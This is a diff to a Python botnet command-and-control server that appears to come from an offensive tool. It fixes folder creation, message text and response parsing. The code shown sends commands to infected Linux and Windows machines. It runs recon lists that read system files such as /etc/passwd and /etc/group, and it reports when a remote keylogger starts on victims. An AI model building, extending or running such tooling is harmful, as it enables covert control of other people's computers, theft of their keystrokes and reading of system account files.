@@ -33,7 +33,8 @@ BUFFER = 20000 # Maximum number of bytes to accept from the output of command.
 COMMMAND_SIZE = 1024 # Maximum number of bytes the command can be.
 ENCODING = 'utf-8' # Encoding scheme.
 DIRECTORY = './bots/' # Directory to store target response files in.
-
+if not os.path.exists(DIRECTORY):
+	os.mkdir(DIRECTORY) # Create the folder where our response files will be stored.
 # -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 
 #   GLOBALS   #
@@ -46,7 +47,7 @@ IP_ADDRESSES = [[],[]] # A list containing the IP addresses of both Lin/Win mach
 # A list containing the commands to gather general recon info for linux machines.
 LINUX_RECON_CMDS = ['cat /etc/passwd', 'cat /etc/group', 'ps aux', 'df', 'top -b -n 1']
 # A list containing the commands to gather general recon info for windows machines.
-WINDOWS_RECON_CMDS = ['os.systeminfo', 'tasklist']
+WINDOWS_RECON_CMDS = ['systeminfo', 'tasklist']
 
 # -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 
@@ -227,10 +228,10 @@ class BotnetCmdCtrl:
 							print(BLUE + str(IP_ADDRESSES[1].index(ip)) + RESET + ' - ' + ip)
 
 			elif cmd.strip() == 'cnt lin':
-				print(f'[{PURPLE + BOLD + str(LINUX_COUNT) + RESET}] Linux.')
+				print(f'[{PURPLE + BOLD + str(LINUX_COUNT) + RESET}] Linux connections.')
 
 			elif cmd.strip() == 'cnt win':
-				print(f'[{PURPLE + BOLD + str(WINDOWS_COUNT) + RESET}] Windows.')
+				print(f'[{PURPLE + BOLD + str(WINDOWS_COUNT) + RESET}] Windows connections.')
 
 			elif cmd[:3] == 'lin':
 				resp_list = self.send_cmd_all_linux(cmd[4:])
@@ -373,7 +374,7 @@ class BotnetCmdCtrl:
 			response = conn.recv(BUFFER).decode(ENCODING) # Store response received from executed command.
 			response = response[2:-1]
 			response = response.replace('\\n', '\n')
-			response = response.replace('\r', '')
+			response = response.replace('\\r', '')
 			response_list.extend([ip, response])
 		return response_list
 	
@@ -423,7 +424,7 @@ class BotnetCmdCtrl:
 			if resp == '[-] Invalid command.' or resp == 'Ok':
 				print(RED + resp + RESET)
 			elif resp == 'listening':
-				print(DARKBLUE + '[*] Keylogger initiated.' + RESET)
+				print(BLUE + '[*] Keylogger initiated.' + RESET)
 			else:
 				resp = resp[2:-1]
 				resp = resp.replace('\\n', '\n')
@@ -474,10 +475,10 @@ class BotnetCmdCtrl:
 				del WINDOWS_CONNS[target_ip]
 				break
 
-			if resp == '[-] Invalid command...' or resp == 'Ok':
+			if resp == '[-] Invalid command.' or resp == 'Ok':
 				print(RED + resp + RESET)
-			elif resp == 'None':
-				print(DARKBLUE + '[*] Keylogger initiated.' + RESET)
+			elif resp == 'listening':
+				print(BLUE + '[*] Keylogger initiated.' + RESET)
 			else:
 				resp = resp[2:-1]
 				resp = resp.replace('\\n', '\n')
